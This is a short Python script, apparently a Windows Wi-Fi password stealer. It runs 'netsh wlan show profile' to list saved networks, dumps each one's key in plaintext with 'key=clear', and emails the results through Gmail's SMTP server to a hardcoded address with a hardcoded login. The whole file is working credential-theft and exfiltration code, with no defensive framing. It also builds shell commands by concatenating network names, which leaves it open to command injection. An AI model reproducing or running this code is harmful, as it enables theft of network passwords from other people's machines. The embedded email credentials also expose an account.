import subprocess, smtplib, re, pprint

def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks.decode("utf-8"))


result = ""
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + network_name + ' key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result.decode()


send_mail('alexnajera86@gmail.com', 'Aiden2011', result)
